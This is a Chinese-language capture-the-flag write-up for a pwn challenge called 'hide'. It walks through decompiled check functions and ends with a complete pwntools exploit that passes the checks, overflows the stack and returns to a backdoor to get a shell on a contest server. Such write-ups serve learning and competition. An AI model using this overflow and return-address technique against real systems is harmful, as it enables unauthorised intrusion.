---
title: hide
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- reverse
---

好像是美团的比赛，纯纯的逆向题

<!-- more -->

捉迷藏，有后门，控制函数流程到栈溢出的函数。

主要要绕的就是两种，一种是要求控制input_val()的值，另一种是fksth()，会和一个指定的字符串进行比较，要求你控制比较的结果，不过后面你的输出会被xor修改。

input_val:相当于atoi()把你输入的字符串转化为数字，以' '作为结束符，长度最大为19

```c
int input_val()
{
  int v0; // eax
  char nptr[27]; // [rsp+0h] [rbp-20h] BYREF
  char v3[5]; // [rsp+1Bh] [rbp-5h]

  v3[4] = 0;
  *(_DWORD *)v3 = (unsigned __int8)getchar();   // 输入v3[0],v3[1]=0 unsigned int8 0~255
  while ( v3[0] != 32 && *(int *)&v3[1] <= 18 ) // v3[1]是循环次数最多19次，输入v3[0]==32==' '可以强行终止循环
  {
    v0 = (*(_DWORD *)&v3[1])++;                 // v0=v3[1];v3[1]++;即每次写nptr的1byte
    nptr[v0] = v3[0];                           // nptr每1byte用v3[0]赋值
    v3[0] = getchar();                          // 输入v3[0]
  }
  nptr[*(int *)&v3[1]] = 0;                     // 加个结束符
  return atoi(nptr);
}
```




fks_sth:类似strcmp()，不过返回的是str1和str2各位的ascii码的差的和

```c
__int64 __fastcall fksth(__int64 a1, __int64 a2)
{
  int i; // [rsp+18h] [rbp-8h]
  unsigned int v4; // [rsp+1Ch] [rbp-4h]

  v4 = 0;
  for ( i = 0; *(_BYTE *)(i + a1) && *(_BYTE *)(i + a2); ++i )
    v4 += *(char *)(i + a1) - *(char *)(i + a2);
  return v4;
}
```

第一个if需要得到false

```c
  input_val();
  input_val();
  input_val();
  v4 = input_val();
  input_val();
  input_val();
  v5 = input_val();
  if ( v5 + v4 + input_val() == 2187 )          // 要false，随便输一下不等于即可
```

```python
for i in range(7):
	input_val(32)
p.sendline(p8(32))

//随便sendline()8次就可以了

```

第二个if需要true

```c
input_line((__int64)&key2, 51uLL);//输入一行作为Key2，共51byte
key2 ^= 1043327323u;//xor处理
if ( (unsigned int)fksth((__int64)&key2, (__int64)"JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe") )
```

其实不用太仔细去考究他的xor，甚至原封不动输回去也可以过。

```python
word2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'
key2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'

p.sendline(key2)
```

第三个if也要true

```c
input_line((__int64)&key3, 53uLL);//输入一行作为Key2，共53byte
key3 ^= 3585375674u;
if ( (unsigned int)fksth((__int64)&key3, (__int64)"eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR") )
```

同上

```python
word3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'
p.sendline(word3)
```

第四个if也要true

```c
input_line((__int64)&key4, 34uLL);
HIBYTE(key4) ^= 0x8Bu;
*(_WORD *)((char *)&key4 + 1) ^= 0x20C1u;
LOBYTE(key4) = key4 ^ 0x30;
if ( (unsigned int)fksth((__int64)&key4, (__int64)"wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO") )
```

花里胡哨的，但也同上

```python
word4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'
p.send(word4)
```

第五个if也要true

```c
v6 = input_val();
v7 = input_val();
v8 = input_val();
key51 = input_val();
key52 = input_val();
v11 = input_val();
v12 = input_val();
v13 = input_val();
if ( key51 - key52 == 9254 )
```

让key51=9255,key52=1即可

```python
for i in range(3):
    input_val(32)
    sleep(0.01)

p.sendline('9255 ')
p.sendline('1 ')

for i in range(3):
    input_val(32)
    sleep(0.01)
```

第六个if也要true

```c
input_line((__int64)&key6, 42uLL);
key6 ^= 0xE2FC7F3C;
if ( !(unsigned int)fksth((__int64)&key6, (__int64)"vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM") )
```

只要ascii码小于每一位就可以了

```python
word6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'
key6  = '\x3c\x7f\xfc\xe2'
key6=key6.ljust(42,'\x00')
p.send(key6)
```

之后栈溢出返回backdoor()即可get shell。

exp:

```python
from pwn import*
elf=ELF("./pwn")
#p=process("./pwn")
p=remote('39.106.133.19',31888)

padding=0xf+0x8
backdoor=0x40132c

def debug():
	gdb.attach(p)
	pause()

def input_val(num):
	p.send(p8(num))
#first if is false
for i in range(7):
	input_val(32)
p.sendline(p8(32))

word2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'
key2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'

p.sendline(key2)

word3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'

p.sendline(word3)

word4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'
key4 = 'vGv}uTiSvbNgLnMp~f``cnBHGN}tNmHXuC'

p.send(word4)



for i in range(3):
    input_val(32)
    sleep(0.01)

p.sendline('9255 ')


p.sendline('1 ')

for i in range(3):
    input_val(32)
    sleep(0.01)


word6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'
#print(word6.lower())
xor=3808198460
key6  = '\x3c\x7f\xfc\xe2'
key6=key6.ljust(42,'\x00')



#print(data)
#print(key6)
#debug()

p.send(key6)


payload='a'*padding+p64(backdoor)
p.sendline(payload.ljust(0x37,'\x00'))

p.interactive()

#solved
```